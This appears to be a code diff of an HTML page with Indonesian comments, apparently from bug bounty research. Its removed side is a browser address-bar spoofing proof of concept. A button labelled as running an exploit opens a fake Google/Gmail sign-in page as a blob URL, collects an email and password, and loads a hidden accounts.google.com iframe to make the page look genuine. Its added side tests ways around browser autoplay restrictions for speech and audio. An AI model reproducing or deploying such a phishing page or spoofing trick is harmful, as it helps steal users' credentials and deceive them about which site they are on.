@@ -1,80 +1,200 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Blob URI Spoofing Fuzzer</title>
-    <style>
-        body { font-family: sans-serif; background: #121212; color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        button { background: #388e3c; color: white; padding: 20px 40px; font-size: 18px; border: none; border-radius: 8px; font-weight: bold; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
-        button:active { background: #2e7d32; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TTS AutoPlay Test</title>
+<style>
+  body {
+    font-family: system-ui, sans-serif;
+    background: #0d1117;
+    color: #c9d1d9;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    margin: 0;
+    padding: 20px;
+  }
+  h1 { color: #58a6ff; }
+  .status {
+    padding: 12px 20px;
+    border-radius: 8px;
+    background: #161b22;
+    border: 1px solid #30363d;
+    margin: 10px;
+    font-family: monospace;
+  }
+  .ok { border-color: #238636; color: #3fb950; }
+  .err { border-color: #da3633; color: #f85149; }
+  #log {
+    max-width: 600px;
+    width: 100%;
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 8px;
+    padding: 15px;
+    font-family: monospace;
+    font-size: 13px;
+    max-height: 300px;
+    overflow-y: auto;
+  }
+  .log-line { margin: 3px 0; }
+  .log-info { color: #58a6ff; }
+  .log-ok { color: #3fb950; }
+  .log-err { color: #f85149; }
+  .log-warn { color: #d29922; }
+</style>
 </head>
 <body>
+  <h1>🔊 TTS AutoPlay Test</h1>
+  <div id="status" class="status">Menunggu...</div>
+  <div id="log"></div>
 
-    <h2>Blob URI Address Bar Spoof</h2>
-    <p style="text-align:center; font-size:14px; color:#aaa; padding: 0 20px;">Menggunakan Blob URL + Meta Refresh untuk membekukan Address Bar.</p>
-    <button onclick="runExploit()">JALANKAN EXPLOIT</button>
+<script>
+const statusEl = document.getElementById('status');
+const logEl = document.getElementById('log');
 
-    <script>
-        function runExploit() {
-            // 1. Siapkan UI Palsu (Google Login)
-            const htmlPayload = `
-                <!DOCTYPE html>
-                <html>
-                <head>
-                    <meta charset="UTF-8">
-                    <title>Sign in - Google Accounts</title>
-                    <style>
-                        body { font-family: 'Roboto', Arial, sans-serif; background: #fff; margin: 0; padding: 0; text-align: center; }
-                        .container { max-width: 400px; margin: 0 auto; padding-top: 50px; }
-                        .logo { width: 80px; margin-bottom: 20px; }
-                        h2 { font-weight: 400; font-size: 24px; margin-bottom: 5px; color: #202124;}
-                        p { font-size: 15px; color: #202124; margin-bottom: 30px; }
-                        input { width: 85%; padding: 15px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; outline: none; }
-                        input:focus { border: 2px solid #1a73e8; padding: 14px; }
-                        .btn { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-size: 14px; font-weight: bold; float: right; margin-right: 7.5%; margin-top: 10px; }
-                    </style>
-                </head>
-                <body>
-                    <div class="container">
-                        <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r5.png" class="logo">
-                        <h2>Sign in</h2>
-                        <p>to continue to Gmail</p>
-                        <input type="text" id="email" placeholder="Email or phone" autocomplete="off">
-                        <input type="password" id="password" placeholder="Password" autocomplete="off">
-                        <button class="btn" onclick="alert('POC SUKSES! Data ditangkap: ' + document.getElementById('email').value)">Next</button>
-                    </div>
+function log(msg, type = 'info') {
+  const line = document.createElement('div');
+  line.className = `log-line log-${type}`;
+  const t = new Date().toLocaleTimeString();
+  line.textContent = `[${t}] ${msg}`;
+  logEl.appendChild(line);
+  logEl.scrollTop = logEl.scrollHeight;
+  console.log(`[${type}] ${msg}`);
+}
 
-                    <!-- SCRIPT SAKTI: META REFRESH + FREEZE -->
-                    <script>
-                        // Kita paksa address bar berubah ke Google setelah form dirender
-                        setTimeout(function() {
-                            // Trik: Gunakan iframe tersembunyi untuk memancing browser agar membaca domain google
-                            let i = document.createElement('iframe');
-                            i.src = "https://accounts.google.com";
-                            i.style.display = "none";
-                            document.body.appendChild(i);
-                            
-                            // Atau gunakan location.replace jika memungkinkan
-                            // window.location.replace("https://accounts.google.com");
-                        }, 50);
-                    <\/script>
-                </body>
-                </html>
-            `;
+function setStatus(msg, ok) {
+  statusEl.textContent = msg;
+  statusEl.className = 'status ' + (ok ? 'ok' : 'err');
+}
 
-            // 2. Buat Blob dari HTML palsu
-            const blob = new Blob([htmlPayload], {type: 'text/html'});
-            const blobUrl = URL.createObjectURL(blob);
+// ============================================
+// TEKS YANG AKAN DIBACAKAN
+// ============================================
+const TEKS = "Halo, ini adalah tes text to speech otomatis tanpa interaksi user.";
 
-            // 3. Buka di tab baru
-            const w = window.open(blobUrl, "_blank");
-            
-            if (!w) {
-                alert("Popup diblokir! Tolong izinkan popup di pengaturan Opera Mini.");
-            }
-        }
-    </script>
+// ============================================
+// METODE 1: Web Speech API (SpeechSynthesis)
+// ============================================
+function trySpeechSynthesis() {
+  log('Mencoba SpeechSynthesis...', 'info');
+  
+  if (!('speechSynthesis' in window)) {
+    log('SpeechSynthesis tidak didukung', 'err');
+    return false;
+  }
+
+  // Trik: trigger speak saat voices belum load kadang gagal
+  const speak = () => {
+    const utter = new SpeechSynthesisUtterance(TEKS);
+    utter.lang = 'id-ID';
+    utter.rate = 1;
+    utter.pitch = 1;
+    utter.volume = 1;
+
+    utter.onstart = () => {
+      log('✅ SpeechSynthesis STARTED (autoplay berhasil!)', 'ok');
+      setStatus('✅ Audio playing via SpeechSynthesis', true);
+    };
+    utter.onend = () => log('SpeechSynthesis selesai', 'ok');
+    utter.onerror = (e) => {
+      log(`❌ SpeechSynthesis error: ${e.error}`, 'err');
+      setStatus('❌ SpeechSynthesis gagal: ' + e.error, false);
+    };
+
+    window.speechSynthesis.speak(utter);
+    log('speak() dipanggil', 'info');
+  };
+
+  // Chrome: voices sering kosong saat pertama, tunggu voiceschanged
+  if (speechSynthesis.getVoices().length === 0) {
+    log('Voices belum loaded, menunggu voiceschanged...', 'warn');
+    speechSynthesis.onvoiceschanged = () => {
+      log(`Voices loaded: ${speechSynthesis.getVoices().length}`, 'info');
+      speak();
+    };
+    // Fallback timeout
+    setTimeout(() => {
+      if (speechSynthesis.getVoices().length > 0) speak();
+    }, 500);
+  } else {
+    speak();
+  }
+  return true;
+}
+
+// ============================================
+// METODE 2: Audio element dengan data URI / remote
+// (untuk tes autoplay policy audio biasa)
+// ============================================
+function tryAudioElement() {
+  log('Mencoba Audio element autoplay...', 'info');
+  
+  // Pakai file audio silent / beep pendek (base64 WAV 0.5s silent)
+  const silentWav = 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQAAAAA=';
+  
+  const audio = new Audio(silentWav);
+  audio.autoplay = true;
+  
+  const playPromise = audio.play();
+  if (playPromise !== undefined) {
+    playPromise
+      .then(() => {
+        log('✅ Audio element autoplay BERHASIL', 'ok');
+      })
+      .catch(err => {
+        log(`❌ Audio element autoplay DIBLOKIR: ${err.name} - ${err.message}`, 'err');
+        log('(Ini normal — browser butuh user gesture)', 'warn');
+      });
+  }
+}
+
+// ============================================
+// METODE 3: Tricky — coba resume() setelah delay
+// Beberapa browser mengizinkan setelah tab visible/focus
+// ============================================
+function tryResumeTrick() {
+  log('Mencoba resume() trick...', 'info');
+  window.speechSynthesis.resume();
+  
+  // Coba panggil ulang speak jika paused
+  if (window.speechSynthesis.paused) {
+    log('SpeechSynthesis paused, mencoba resume', 'warn');
+    window.speechSynthesis.resume();
+  }
+}
+
+// ============================================
+// JALANKAN SEMUA
+// ============================================
+window.addEventListener('load', () => {
+  log('Page loaded, mulai autoplay test', 'info');
+  log(`User agent: ${navigator.userAgent}`, 'info');
+  
+  // Metode 1
+  trySpeechSynthesis();
+  
+  // Metode 2 (paralel)
+  tryAudioElement();
+  
+  // Metode 3 (delayed)
+  setTimeout(tryResumeTrick, 1000);
+  
+  // Monitor state
+  setInterval(() => {
+    if (window.speechSynthesis.speaking) {
+      setStatus('🔊 Sedang berbicara...', true);
+    }
+  }, 2000);
+});
+
+// Log visibility state (buat riset bug bounty)
+document.addEventListener('visibilitychange', () => {
+  log(`Visibility: ${document.visibilityState}`, 'warn');
+});
+</script>
 </body>
 </html>
